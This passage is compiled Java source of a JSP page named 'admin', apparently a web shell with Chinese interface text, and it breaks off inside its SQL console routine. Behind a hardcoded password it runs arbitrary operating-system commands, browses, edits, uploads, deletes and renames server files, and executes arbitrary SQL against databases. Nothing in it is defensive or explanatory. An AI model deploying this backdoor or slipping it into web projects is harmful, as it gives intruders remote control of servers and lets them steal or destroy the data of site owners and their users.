/*
 * JSP generated by Resin-3.0.21 (built Thu, 10 Aug 2006 12:03:19 PDT)
 */

package _jsp;
import javax.servlet.*;
import javax.servlet.jsp.*;
import javax.servlet.http.*;
import java.io.*;
import java.util.Map;
import java.util.HashMap;
import java.nio.charset.Charset;
import java.util.regex.*;
import java.sql.*;

public class _admin__jsp extends com.caucho.jsp.JavaPage{
  private boolean _caucho_isDead;

  
  private String _password = "love";
  private String _encodeType = "UTF-8";
  private int _sessionOutTime = 20;
  private String[] _textFileTypes = {"txt", "htm", "html", "asp", "jsp", "java", "js", "css", "c", "cpp", "sh", "pl", "cgi", "php", "conf", "xml", "xsl", "ini", "vbs", "inc"};
  private Connection _dbConnection = null;
  private Statement _dbStatement = null;
  private String _url = null;
  
  public boolean validate(String password) {
  	if (password.equals(_password)) {
  		return true;
  	} else {
  		return false;
  	}
  }
  
  public String HTMLEncode(String str) {
  	str = str.replaceAll(" ", "&nbsp;");
  	str = str.replaceAll("<", "&lt;");
  	str = str.replaceAll(">", "&gt;");
  	str = str.replaceAll("\r\n", "<br>");
  	
  	return str;
  }
  
  public String Unicode2GB(String str) {
  	String sRet = null;
  	
  	try {
  		sRet = new String(str.getBytes("ISO8859_1"), _encodeType);
  	} catch (Exception e) {
  		sRet = str;
  	}
  	
  	return sRet;
  }
  
  public String exeCmd(String cmd) {
  	Runtime runtime = Runtime.getRuntime();
  	Process proc = null;
  	String retStr = "";
  	InputStreamReader insReader = null;
  	char[] tmpBuffer = new char[1024];
  	int nRet = 0;
  	
  	try {
  		proc = runtime.exec(cmd);
  		insReader = new InputStreamReader(proc.getInputStream(), Charset.forName("GB2312"));
  		
  		while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {
  			retStr += new String(tmpBuffer, 0, nRet);
  		}
  		
  		insReader.close();
  		retStr = HTMLEncode(retStr);
  	} catch (Exception e) {
  		retStr = "<font color=\"red\">bad command \"" + cmd + "\"</font>";
  	} finally {
  		return retStr;
  	}
  }
  
  public String pathConvert(String path) {
  	String sRet = path.replace('\\', '/');
  	File file = new File(path);
  	
  	if (file.getParent() != null) {
  		if (file.isDirectory()) {
  			if (! sRet.endsWith("/"))
  				sRet += "/";
  		}
  	} else {
  		if (! sRet.endsWith("/"))
  			sRet += "/";	
  	}
  	
  	return sRet;
  }
  
  public String strCut(String str, int len) {
  	String sRet;
  	
  	len -= 3;
  	
  	if (str.getBytes().length <= len) {
  		sRet = str;
  	} else {
  		try {
  			sRet = (new String(str.getBytes(), 0, len, "GBK")) + "...";
  		} catch (Exception e) {
  			sRet = str;
  		}
  	}
  	
  	return sRet;
  }
  
  public String listFiles(String path, String curUri) {
  	File[] files = null;
  	File curFile = null;
  	String sRet = null;
  	int n = 0;
  	boolean isRoot = path.equals("");
  	
  	path = pathConvert(path);
  	
  	try {
  		if (isRoot) {
  			files = File.listRoots();
  		} else {
  			try {
  				curFile = new File(path);
  				String[] sFiles = curFile.list();
  				files = new File[sFiles.length];
  					
  				for (n = 0; n < sFiles.length; n ++) {
  					files[n] = new File(path + sFiles[n]);
  				}
  			} catch (Exception e) {
  				sRet = "<font color=\"red\">bad path \"" + path + "\"</font>";
  			}
  		}
  		
  		if (sRet == null) {
  			sRet = "\n";
  			sRet += "<script language=\"javascript\">\n";
  			sRet += "var selectedFile = null;\n";
  			sRet += "<!--\n";
  			sRet += "function createFolder() {\n";
  			sRet += "	var folderName = prompt(\"\u8bf7\u8f93\u5165\u76ee\u5f55\u540d\", \"\");\n";
  			sRet += "	if (folderName != null && folderName != false && ltrim(folderName) != \"\") {\n";
  			sRet += "		window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=createFolder&folderName=\" + folderName + \"" + "\";\n";
  			sRet += "	}\n";
  			sRet += "}\n";
  			sRet += "\n";
  			sRet += "function createFile() {\n";
  			sRet += "	var fileName = prompt(\"\u8bf7\u8f93\u5165\u6587\u4ef6\u540d\", \"\");\n";
  			sRet += "	if (fileName != null && fileName != false && ltrim(fileName) != \"\") {\n";
  			sRet += "		window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=createFile&fileName=\" + fileName + \"" + "\";\n";
  			sRet += "	}\n";
  			sRet += "}\n";
  			sRet += "\n";
  			sRet += "function selectFile(obj) {\n";
  			sRet += "	if (selectedFile != null)\n";
  			sRet += "		selectedFile.style.backgroundColor = \"#FFFFFF\";\n";
  			sRet += "	selectedFile = obj;\n";
  			sRet += "	obj.style.backgroundColor = \"#CCCCCC\";\n";
  			sRet += "}\n";
  			sRet += "\n";
  			sRet += "function change(obj) {\n";
  			sRet += "	if (selectedFile != obj)\n";
  			sRet += "		obj.style.backgroundColor = \"#CCCCCC\";\n";
  			sRet += "}\n";
  			sRet += "\n";
  			sRet += "function restore(obj) {\n";
  			sRet += "	if (selectedFile != obj)\n";
  			sRet += "		obj.style.backgroundColor = \"#FFFFFF\";\n";
  			sRet += "}\n";
  			sRet += "\n";
  			sRet += "function showUpload() {\n";
  			sRet += "	up.style.visibility = \"visible\";\n";
  			sRet += "}\n";
  			sRet += "\n";
  			sRet += "function copyFile() {\n";
  			sRet += "	var toPath = prompt(\"\u8bf7\u8f93\u5165\u8981\u590d\u5236\u5230\u7684\u76ee\u5f55(\u7edd\u5bf9\u8def\u5f84)\", \"\");\n";
  			sRet += "	if (toPath != null && toPath != false && ltrim(toPath) != \"\") {\n";
  			sRet += "		document.fileList.action = \"" + curUri + "&curPath=" + path + "&fsAction=copyto&dstPath=" + "\" + toPath;\n";
  			sRet += "		document.fileList.submit();\n";
  			sRet += "	}\n";
  			sRet += "}\n";
  			sRet += "\n";
  			sRet += "function rename() {\n";
  			sRet += "	var count = 0;\n";
  			sRet += "	var selected = -1;\n";
  			sRet += "	for (var i = 0; i < document.fileList.filesDelete.length; i ++) {\n";
  			sRet += "		if (document.fileList.filesDelete[i].checked) {\n";
  			sRet += "			count ++;\n";
  			sRet += "			selected = i;\n";
  			sRet += "		}\n";
  			sRet += "	}\n";
  			sRet += "	if (count > 1)\n";
  			sRet += "		alert(\"\u4e0d\u80fd\u91cd\u547d\u540d\u591a\u4e2a\u6587\u4ef6\");\n";
  			sRet += "	else if (selected == -1)\n";
  			sRet += "		alert(\"\u6ca1\u6709\u9009\u4e2d\u8981\u91cd\u547d\u540d\u7684\u6587\u4ef6\");\n";
  			sRet += "	else {\n";
  			sRet += "		var newName = prompt(\"\u8bf7\u8f93\u5165\u65b0\u6587\u4ef6\u540d\", \"\");\n";
  			sRet += "		if (newName != null && newName != false && ltrim(newName) != \"\") {\n";
  			sRet += "			window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=rename&newName=\" + newName + \"&fileRename=\" + document.fileList.filesDelete[selected].value;";
  			sRet += "		}\n";
  			sRet += "	}\n";
  			sRet += "}\n";
  			sRet += "\n";
  			sRet += "//-->\n";
  			sRet += "</script>\n";
  			sRet += "<table width=\"100%\" border=\"0\" cellpadding=\"2\" cellpadding=\"1\">\n";
  			sRet += "	<form enctype=\"multipart/form-data\" method=\"post\" name=\"upload\" action=\"" + curUri + "&curPath=" + path + "&fsAction=upload" + "\">\n";
  			
  			if (curFile != null) {
  				sRet += "	<tr>\n";
  				sRet += "		<td colspan=\"4\" valign=\"middle\">\n";
  				sRet += "			&nbsp;<a href=\"" + curUri + "&curPath=" + (curFile.getParent() == null ? "" : pathConvert(curFile.getParent())) + "\">\u4e0a\u7ea7\u76ee\u5f55</a>&nbsp;";
  				sRet += "<a href=\"#\" onclick=\"javascript:createFolder()\">\u521b\u5efa\u76ee\u5f55</a>&nbsp;";
  				sRet += "<a href=\"#\" onclick=\"javascript:createFile()\">\u65b0\u5efa\u6587\u4ef6</a>&nbsp;";
  				sRet += "<a href=\"#\" onclick=\"javascript:document.fileList.submit();\">\u5220\u9664</a>&nbsp;";
  				sRet += "<a href=\"#\" onclick=\"javascript:copyFile()\">\u590d\u5236</a>&nbsp;";
  				sRet += "<a href=\"#\" onclick=\"javascript:rename()\">\u91cd\u547d\u540d</a>&nbsp;";
  				sRet += "<a href=\"#\" onclick=\"javascript:showUpload()\">\u4e0a\u4f20\u6587\u4ef6</a>\n";
  				sRet += "<span style=\"visibility: hidden\" id=\"up\"><input type=\"file\" value=\"\u4e0a\u4f20\" name=\"upFile\" size=\"8\" class=\"textbox\" />&nbsp;<input type=\"submit\" value=\"\u4e0a\u4f20\" class=\"button\"></span>\n";
  				sRet += "		</td>\n";
  				sRet += "	</tr>\n";
  			}
  			
  			sRet += "</form>\n";
  			
  			sRet += "	<form name=\"fileList\" method=\"post\" action=\"" + curUri + "&curPath=" + path + "&fsAction=deleteFile" + "\">\n";
  			
  			for (n = 0; n < files.length; n ++) {
  				sRet += "	<tr onclick=\"javascript: selectFile(this)\" onmouseover=\"javascript: change(this)\" onmouseout=\"javascript: restore(this)\" style=\"cursor:hand;\">\n";
  				
  				if (! isRoot) {
  					sRet += "		<td width=\"5%\" align=\"center\"><input type=\"checkbox\" name=\"filesDelete\" value=\"" + pathConvert(files[n].getPath()) + "\" /></td>\n";
  					if (files[n].isDirectory()) {
  						sRet += "		<td><a href=\"" + curUri + "&curPath=" + pathConvert(files[n].getPath()) + "\" title=\"" + files[n].getName() + "\">&lt;" + strCut(files[n].getName(), 50) + "&gt;</a></td>\n";
  					} else {
  						sRet += "		<td><a title=\"" + files[n].getName() + "\">" + strCut(files[n].getName(), 50) + "</a></td>\n";
  					}
  					
  					sRet += "		<td width=\"15%\" align=\"center\">" + (files[n].isDirectory() ? "&lt;dir&gt;" : "") + ((! files[n].isDirectory()) && isTextFile(getExtName(files[n].getPath())) ? "<<a href=\"" + curUri + "&curPath=" + pathConvert(files[n].getPath()) + "&fsAction=open" + "\">edit</a>>" : "") + "</td>\n";
  					sRet += "		<td width=\"15%\" align=\"center\">" + files[n].length() + "</td>\n";
  				} else {
  					sRet += "		<td><a href=\"" + curUri + "&curPath=" + pathConvert(files[n].getPath()) + "\" title=\"" + files[n].getName() + "\">" + pathConvert(files[n].getPath()) + "</a></td>\n";
  				}
  	
  				sRet += "	</tr>\n";
  			}
  			sRet += "	</form>\n";
  			sRet += "</table>\n";
  		}
  	} catch (SecurityException e) {
  		sRet = "<font color=\"red\">security violation, no privilege.</font>";
  	}
  	
  	return sRet;
  }
  
  public boolean isTextFile(String extName) {
  	int i;
  	boolean bRet = false;
  	
  	if (! extName.equals("")) {
  		for (i = 0; i < _textFileTypes.length; i ++) {
  			if (extName.equals(_textFileTypes[i])) {
  				bRet = true;
  				break;
  			}
  		}
  	} else {
  		bRet = true;
  	}
  	
  	return bRet;
  }
  
  public String getExtName(String fileName) {
  	String sRet = "";
  	int	nLastDotPos;
  	
  	fileName = pathConvert(fileName);
  	
  	nLastDotPos = fileName.lastIndexOf(".");
  	
  	if (nLastDotPos == -1) {
  		sRet = "";
  	} else {
  		sRet = fileName.substring(nLastDotPos + 1);
  	}
  	
  	return sRet;
  }
  
  public String browseFile(String path) {
  	String sRet = "";
  	File file = null;
  	FileReader fileReader = null;
  	
  	path = pathConvert(path);
  	
  	try {
  		file = new File(path);
  		fileReader = new FileReader(file);
  		String fileString = "";
  		char[] chBuffer = new char[1024];
  		int ret;
  		
  		sRet = "<script language=\"javascript\">\n";
  		
  		while ((ret = fileReader.read(chBuffer, 0, 1024)) != -1) {
  			fileString += new String(chBuffer, 0, ret);
  		}
  		
  		sRet += "var wnd = window.open(\"about:blank\", \"_blank\", \"width=600, height=500\");\n";
  		sRet += "var doc = wnd.document;\n";
  		sRet += "doc.write(\"" + "aaa" + "\");\n";
  		
  		sRet += "</script>\n";
  		
  	} catch (IOException e) {
  		sRet += "<script language=\"javascript\">\n";
  		sRet += "alert(\"\u6253\u5f00\u6587\u4ef6" + path + "\u5931\u8d25\");\n";
  		sRet += "</script>\n";
  	}
  	
  	return sRet;
  }
  
  public String openFile(String path, String curUri) {
  	String sRet = "";
  	boolean canOpen = false;
  	int nLastDotPos = path.lastIndexOf(".");
  	String extName = "";
  	String fileString = null;
  	File curFile = null;
  	
  	path = pathConvert(path);
  	
  	if (nLastDotPos == -1) {
  		canOpen = true;
  	} else {
  		extName = path.substring(nLastDotPos + 1);
  		canOpen = isTextFile(extName);
  	}
  	
  	if (canOpen) {
  		try {
  			fileString = "";
  			curFile = new File(path);
  			FileReader fileReader = new FileReader(curFile);
  			char[] chBuffer = new char[1024];
  			int nRet;
  			
  			while ((nRet = fileReader.read(chBuffer, 0, 1024)) != -1) {
  				fileString += new String(chBuffer, 0, nRet);
  			}
  			
  			fileReader.close();
  		} catch (IOException e) {
  			fileString = null;
  			sRet = "<font color=\"red\">\u4e0d\u80fd\u6253\u5f00\u6587\u4ef6\"" + path + "\"</font>";
  		} catch (SecurityException e) {
  			fileString = null;
  			sRet = "<font color=\"red\">\u5b89\u5168\u95ee\u9898\uff0c\u6ca1\u6709\u6743\u9650\u6267\u884c\u8be5\u64cd\u4f5c</font>";
  		}
  	} else {
  		sRet = "<font color=\"red\">file \"" + path + "\" is not a text file, can't be opened in text mode</font>";
  	}
  	
  	if (fileString != null) {
  		sRet += "<script language=\"javascript\">";
  		sRet += "<!--\n";
  		sRet += "function saveAs() {\n";
  		sRet += "	var fileName = prompt(\"\u8bf7\u8f93\u5165\u6587\u4ef6\u540d\", \"\");\n";
  		sRet += "	if (fileName != null && fileName != false && ltrim(fileName) != \"\") {\n";
  		sRet += "		document.openfile.action=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\" + fileName + \"&fsAction=saveAs\";\n";
  		sRet += "		document.openfile.submit();\n";
  		sRet += "	}\n";
  		sRet += "}\n";
  		sRet += "//-->\n";
  		sRet += "</script>\n";
  		sRet += "<table align=\"center\" width=\"100%\" cellpadding=\"2\" cellspacing=\"1\">\n";
  		sRet += "	<form name=\"openfile\" method=\"post\" action=\"" + curUri + "&curPath=" + path + "&fsAction=save" + "\">\n";
  		sRet += "	<tr>\n";
  		sRet += "		<td>[<a href=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\">\u4e0a\u7ea7\u76ee\u5f55</a>]</td>\n";
  		sRet += "	</tr>\n";
  		sRet += "	<tr>\n";
  		sRet += "		<td align=\"center\">\n";
  		sRet += "			<textarea name=\"fileContent\" cols=\"80\" rows=\"32\">\n";
  		sRet += fileString;
  		sRet += "			</textarea>\n";
  		sRet += "		</td>\n";
  		sRet += "	</tr>\n";
  		sRet += "	<tr>\n";
  		sRet += "		<td align=\"center\"><input type=\"submit\" class=\"button\" value=\"\u4fdd\u5b58\" />&nbsp;<input type=\"button\" class=\"button\" value=\"\u53e6\u5b58\u4e3a\" onclick=\"javascript:saveAs()\" /></td>\n";
  		sRet += "	</tr>\n";
  		sRet += "	</form>\n";
  		sRet += "</table>\n";
  	}
  	
  	return sRet;
  }
  
  public String saveFile(String path, String curUri, String fileContent) {
  	String sRet = "";
  	File file = null;
  	
  	path = pathConvert(path);
  	
  	try {
  		file = new File(path);
  		
  		if (! file.canWrite()) {
  			sRet = "<font color=\"red\">\u6587\u4ef6\u4e0d\u53ef\u5199</font>";
  		} else {
  			FileWriter fileWriter = new FileWriter(file);
  			fileWriter.write(fileContent);
  			
  			fileWriter.close();
  			sRet = "\u6587\u4ef6\u4fdd\u5b58\u6210\u529f\uff0c\u6b63\u5728\u8fd4\u56de\uff0c\u8bf7\u7a0d\u5019\u2026\u2026\n";
  			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "&fsAction=open" + "\" />\n";	
  		}
  	} catch (IOException e) {
  		sRet = "<font color=\"red\">\u4fdd\u5b58\u6587\u4ef6\u5931\u8d25</font>";
  	} catch (SecurityException e) {
  		sRet = "<font color=\"red\">\u5b89\u5168\u95ee\u9898\uff0c\u6ca1\u6709\u6743\u9650\u6267\u884c\u8be5\u64cd\u4f5c</font>";
  	}
  	
  	return sRet;
  }
  
  public String createFolder(String path, String curUri, String folderName) {
  	String sRet = "";
  	File folder = null;
  	
  	path = pathConvert(path);
  	
  	try {
  		folder = new File(path + folderName);
  		
  		if (folder.exists() && folder.isDirectory()) {
  			sRet = "<font color=\"red\">\"" + path + folderName + "\"\u76ee\u5f55\u5df2\u7ecf\u5b58\u5728</font>";
  		} else {
  			if (folder.mkdir()) {
  				sRet = "\u6210\u529f\u521b\u5efa\u76ee\u5f55\"" + pathConvert(folder.getPath()) + "\"\uff0c\u6b63\u5728\u8fd4\u56de\uff0c\u8bf7\u7a0d\u5019\u2026\u2026\n";
  					sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + folderName + "\" />";
  			} else {
  				sRet = "<font color=\"red\">\u521b\u5efa\u76ee\u5f55\"" + folderName + "\"\u5931\u8d25</font>";
  			}
  		}
  	} catch (SecurityException e) {
  		sRet = "<font color=\"red\">\u5b89\u5168\u95ee\u9898\uff0c\u6ca1\u6709\u6743\u9650\u6267\u884c\u8be5\u64cd\u4f5c</font>";
  	}
  	
  	return sRet;
  }
  
  public String createFile(String path, String curUri, String fileName) {
  	String sRet = "";
  	File file = null;
  	
  	path = pathConvert(path);
  	
  	try {
  		file = new File(path + fileName);
  		
  		if (file.createNewFile()) {
  			sRet = "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + fileName + "&fsAction=open" + "\" />";
  		} else {
  			sRet = "<font color=\"red\">\"" + path + fileName + "\"\u6587\u4ef6\u5df2\u7ecf\u5b58\u5728</font>";
  		}
  	} catch (SecurityException e) {
  		sRet = "<font color=\"red\">\u5b89\u5168\u95ee\u9898\uff0c\u6ca1\u6709\u6743\u9650\u6267\u884c\u8be5\u64cd\u4f5c</font>";
  	} catch (IOException e) {
  		sRet = "<font color=\"red\">\u521b\u5efa\u6587\u4ef6\"" + path + fileName + "\"\u5931\u8d25</font>";
  	}
  	
  	return sRet;
  } 
  
  public String deleteFile(String path, String curUri, String[] files2Delete) {
  	String sRet = "";
  	File tmpFile = null;
  	
  	try {
  		for (int i = 0; i < files2Delete.length; i ++) {
  			tmpFile = new File(files2Delete[i]);
  			if (! tmpFile.delete()) {
  				sRet += "<font color=\"red\">\u5220\u9664\"" + files2Delete[i] + "\"\u5931\u8d25</font><br>\n";
  			}
  		}
  		
  		if (sRet.equals("")) {
  			sRet = "\u5220\u9664\u6210\u529f\uff0c\u6b63\u5728\u8fd4\u56de\uff0c\u8bf7\u7a0d\u5019\u2026\u2026\n";
  			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
  		}
  	} catch (SecurityException e) {
  		sRet = "<font color=\"red\">\u5b89\u5168\u95ee\u9898\uff0c\u6ca1\u6709\u6743\u9650\u6267\u884c\u8be5\u64cd\u4f5c</font>\n";
  	}
  	
  	return sRet;
  }
  
  public String saveAs(String path, String curUri, String fileContent) {
  	String sRet = "";
  	File file = null;
  	FileWriter fileWriter = null;
  	
  	try {
  		file = new File(path);
  		
  		if (file.createNewFile()) {
  			fileWriter = new FileWriter(file);
  			fileWriter.write(fileContent);
  			fileWriter.close();
  			
  			sRet = "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + "&fsAction=open" + "\" />";
  		} else {
  			sRet = "<font color=\"red\">\u6587\u4ef6\"" + path + "\"\u5df2\u7ecf\u5b58\u5728</font>";
  		}
  	} catch (IOException e) {
  		sRet = "<font color=\"red\">\u521b\u5efa\u6587\u4ef6\"" + path + "\"\u5931\u8d25</font>";
  	}	
  	
  	return sRet;
  }
  
  
  public String uploadFile(ServletRequest request, String path, String curUri) {
  	String sRet = "";
  	File file = null;
  	InputStream in = null;
  	
  	path = pathConvert(path);
  	
  	try {
  		in = request.getInputStream();
  		
  		byte[] inBytes = new byte[request.getContentLength()];
  		int nBytes;
  		int start = 0;
  		int end = 0;
  		int size = 1024;
  		String token = null;
  		String filePath = null;
  
  		//
  		// \u628a\u8f93\u5165\u6d41\u8bfb\u5165\u4e00\u4e2a\u5b57\u8282\u6570\u7ec4
  		//
  		while ((nBytes = in.read(inBytes, start, size)) != -1) {
  			start += nBytes;
  		}
  		
  		in.close();
  		//
  		// \u4ece\u5b57\u8282\u6570\u7ec4\u4e2d\u5f97\u5230\u6587\u4ef6\u5206\u9694\u7b26\u53f7
  		//
  		int i = 0;
  		byte[] seperator;
  		
  		while (inBytes[i] != 13) {
  			i ++;
  		}
  		
  		seperator =  new byte[i];
  	
  		for (i = 0; i < seperator.length; i ++) {
  			seperator[i] = inBytes[i];
  		}
  		
  		//
  		// \u5f97\u5230Header\u90e8\u5206
  		//
  		String dataHeader = null;
  		i += 3;
  		start = i;
  		while (! (inBytes[i] == 13 && inBytes[i + 2] == 13)) {
  			i ++;
  		}
  		end = i - 1;
  		dataHeader = new String(inBytes, start, end - start + 1);
  		
  		//
  		// \u5f97\u5230\u6587\u4ef6\u540d
  		//
  		token = "filename=\"";
  		start = dataHeader.indexOf(token) + token.length();
  		token = "\"";
  		end = dataHeader.indexOf(token, start) - 1;
  		filePath = dataHeader.substring(start, end + 1);
  		filePath = 	pathConvert(filePath);
  		String fileName = filePath.substring(filePath.lastIndexOf("/") + 1);
  		
  		//
  		// \u5f97\u5230\u6587\u4ef6\u5185\u5bb9\u5f00\u59cb\u4f4d\u7f6e
  		//	
  		i += 4;
  		start = i;
  		
  		/*
  		boolean found = true;		
  		byte[] tmp = new byte[seperator.length];
  		while (i <= inBytes.length - 1 - seperator.length) {
  		
  			for (int j = i; j < i + seperator.length; j ++) { 
  				if (seperator[j - i] != inBytes[j]) {
  					found = false;
  					break;
  				} else
  					tmp[j - i] = inBytes[j];
  			}
  			
  			if (found)
  				break;
  			
  			i ++;
  		}*/
  		
  		//
  		// \u5077\u61d2\u7684\u529e\u6cd5
  		//
  		end = inBytes.length - 1 - 2 - seperator.length - 2 - 2;
  		
  		//
  		// \u4fdd\u5b58\u4e3a\u6587\u4ef6
  		//
  		File newFile = new File(path + fileName);
  		newFile.createNewFile();
  		FileOutputStream out = new FileOutputStream(newFile);
  		
  		//out.write(inBytes, start, end - start + 1);
  		out.write(inBytes, start, end - start + 1);
  		out.close();
  		
  		sRet = "<script language=\"javascript\">\n";
  		sRet += "alert(\"\u6587\u4ef6\u4e0a\u4f20\u6210\u529f" + fileName + "\");\n";
  		sRet += "</script>\n";
  	} catch (IOException e) {
  		sRet = "<script language=\"javascript\">\n";
  		sRet += "alert(\"\u6587\u4ef6\u4e0a\u4f20\u5931\u8d25\");\n";
  		sRet += "</script>\n";
  	}
  	
  	sRet += "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + "\" />";
  	return sRet;
  }
  
  public boolean fileCopy(String srcPath, String dstPath) {
  	boolean bRet = true;
  	
  	try {
  		FileInputStream in = new FileInputStream(new File(srcPath));
  		FileOutputStream out = new FileOutputStream(new File(dstPath));
  		byte[] buffer = new byte[1024];
  		int nBytes;
  		
  
  		while ((nBytes = in.read(buffer, 0, 1024)) != -1) {
  			out.write(buffer, 0, nBytes);
  		}
  		
  		in.close();
  		out.close();
  	} catch (IOException e) {
  		bRet = false;
  	}	
  	
  	return bRet;
  }
  
  public String getFileNameByPath(String path) {
  	String sRet = "";
  	
  	path = pathConvert(path);
  	
  	if (path.lastIndexOf("/") != -1) {
  		sRet = path.substring(path.lastIndexOf("/") + 1);
  	} else {
  		sRet = path;
  	}
  	
  	return sRet;
  }
  
  public String copyFiles(String path, String curUri, String[] files2Copy, String dstPath) {
  	String sRet = "";
  	int i;
  	
  	path = pathConvert(path);
  	dstPath = pathConvert(dstPath);
  	
  	for (i = 0; i < files2Copy.length; i ++) {
  		if (! fileCopy(files2Copy[i], dstPath + getFileNameByPath(files2Copy[i]))) {
  			sRet += "<font color=\"red\">\u6587\u4ef6\"" + files2Copy[i] + "\"\u590d\u5236\u5931\u8d25</font><br/>";
  		}
  	}
  	
  	if (sRet.equals("")) {
  		sRet = "\u6587\u4ef6\u590d\u5236\u6210\u529f\uff0c\u6b63\u5728\u8fd4\u56de\uff0c\u8bf7\u7a0d\u5019\u2026\u2026";
  		sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
  	}
  	
  	return sRet;
  }
  
  public boolean isFileName(String fileName) {
  	boolean bRet = false;
  	
  	Pattern p = Pattern.compile("^[a-zA-Z0-9][\\w\\.]*[\\w]$");
  	Matcher m = p.matcher(fileName);
  	
  	bRet = m.matches();
  	
  	return bRet;
  }
  
  public String renameFile(String path, String curUri, String file2Rename, String newName) {
  	String sRet = "";
  	
  	path = pathConvert(path);
  	file2Rename = pathConvert(file2Rename);
  	
  	try {
  		File file = new File(file2Rename);
  		
  		newName = file2Rename.substring(0, file2Rename.lastIndexOf("/") + 1) + newName;
  		File newFile = new File(newName);
  		
  		if (! file.exists()) {
  			sRet = "<font color=\"red\">\u6587\u4ef6\"" + file2Rename + "\"\u4e0d\u5b58\u5728</font>";
  		} else {
  			file.renameTo(newFile);
  			sRet = "\u6587\u4ef6\u91cd\u547d\u540d\u6210\u529f\uff0c\u6b63\u5728\u8fd4\u56de\uff0c\u8bf7\u7a0d\u5019\u2026\u2026";
  			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
  		}
  	} catch (SecurityException e) {
  		sRet = "<font color=\"red\">\u5b89\u5168\u95ee\u9898\u5bfc\u81f4\u6587\u4ef6\"" + file2Rename + "\"\u590d\u5236\u5931\u8d25</font>";
  	}
  	
  	return sRet;
  }
  
  public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {
  	boolean bRet = true;
  	String driverName = "";
  	
  	if (dbServer.equals(""))
  		dbServer = "localhost";
  	
  	try {
  		if (dbType.equals("sqlserver")) {
  			driverName = "com.microsoft.jdbc.sqlserver.SQLServerDriver";
  			if (dbPort.equals(""))
  				dbPort = "1433";
  			_url = "jdbc:microsoft:sqlserver://" + dbServer + ":" + dbPort + ";User=" + dbUsername + ";Password=" + dbPassword + ";DatabaseName=" + dbName;
  		} else if (dbType.equals("mysql")) {
  			driverName = "com.mysql.jdbc.Driver";
  			if (dbPort.equals(""))
  				dbPort = "3306";
  			_url = "jdbc:mysql://" + dbServer + ":" + dbPort + ";User=" + dbUsername + ";Password=" + dbPassword + ";DatabaseName=" + dbName;
  		} else if (dbType.equals("odbc")) {
  			driverName = "sun.jdbc.odbc.JdbcOdbcDriver";
  			_url = "jdbc:odbc:dsn=" + dbName + ";User=" + dbUsername + ";Password=" + dbPassword;
  		} else if (dbType.equals("oracle")) {
  			driverName = "oracle.jdbc.driver.OracleDriver";
  			_url = "jdbc:oracle:thin@" + dbServer + ":" + dbPort + ":" + dbName;
  		} else if (dbType.equals("db2")) {
  			driverName = "com.ibm.db2.jdbc.app.DB2Driver";
  			_url = "jdbc:db2://" + dbServer + ":" + dbPort + "/" + dbName;
  		}
  		
  		Class.forName(driverName);
  	} catch (ClassNotFoundException e) {
  		bRet = false;
  	}
  	
  	return bRet;
  }
  
  public boolean DBConnect(String User, String Password) {
  	boolean bRet = false;
  	
  	if (_url != null) {
  		try {
  			_dbConnection = DriverManager.getConnection(_url, User, Password);
  			_dbStatement = _dbConnection.createStatement();
  			bRet = true; 
  		} catch (SQLException e) {
  			bRet = false;
  		}	
  	} 
  	
  	return bRet;
  }
  
  public String DBExecute(String sql) {
  	String sRet = "";
  	
  	if (_dbConnection == null || _dbStatement == null) {
  		sRet = "<font color=\"red\">\u6570\u636e\u5e93\u6ca1\u6709\u6b63\u5e38\u8fde\u63a5</font>";
  	} else {
  		try {
  			if (sql.toLowerCase().substring(0, 6).equals("select")) {
  				ResultSet rs = _dbStatement.executeQuery(sql);
  				ResultSetMetaData rsmd = rs.getMetaData();
  				int colNum = rsmd.getColumnCount();
  				int colType;
  				
  				sRet = "sql\u8bed\u53e5\u6267\u884c\u6210\u529f\uff0c\u8fd4\u56de\u7ed3\u679c<br>\n";
  				sRet += "<table align=\"center\" border=\"0\" bgcolor=\"#CCCCCC\" cellpadding=\"2\" cellspacing=\"1\">\n";
  				sRet +=	"    <tr bgcolor=\"#FFFFFF\">\n";
  				for (int i = 1; i <= colNum; i ++) {
  					sRet += "        <th>" + rsmd.getColumnName(i) + "(" + rsmd.getColumnTypeName(i) + ")</th>\n";
  				}
  				sRet += "    </tr>\n";
  				while (rs.next()) {
  					sRet += "	<tr bgcolor=\"#FFFFFF\">\n";
  					for (int i = 1; i <= colNum; i ++) {
  						colType = rsmd.getColumnType(i);
  						
  						sRet += "		<td>";
  						switch (colType) {
  							case Types.BIGINT:
  							sRet += rs.getLong(i);
  							break;
  							
  							case Types.BIT:
  							sRet += rs.getBoolean(i);
  							break;
  							
  							case Types.BOOLEAN:
  							sRet += rs.getBoolean(i);
  							break;
  							
  							case Types.CHAR:
  							sRet += rs.getString(i);
  							break;
  							
  							case Types.DATE:
  							sRet += rs.getDate(i).toString();
  							break;
  							
  							case Types.DECIMAL:
  							sRet += rs.getDouble(i);
  							break;
  							
  							case Types.NUMERIC:
  							sRet += rs.getDouble(i);
  							break;
  							
  							case Types.REAL:
  							sRet += rs.getDouble(i);
  							break;
  							
  							case Types.DOUBLE:
  							sRet += rs.getDouble(i);
  							break;
  							
  							case Types.FLOAT:
  							sRet += rs.getFloat(i);
  							break;
  							
  							case Types.INTEGER:
  							sRet += rs.getInt(i);
  							break;
  							
  							case Types.TINYINT:
  							sRet += rs.getShort(i);
  							break;
  							
  							case Types.VARCHAR:
  							sRet += rs.getString(i);
  							break;
  							
  							case Types.TIME:
  							sRet += rs.getTime(i).toString();
  							break;
  							
  							case Types.DATALINK:
  							sRet += rs.getTimestamp(i).toString();
  							break;
  						}
  						sRet += "		</td>\n";
  					}
  					sRet += "	</tr>\n"; 
  				}				
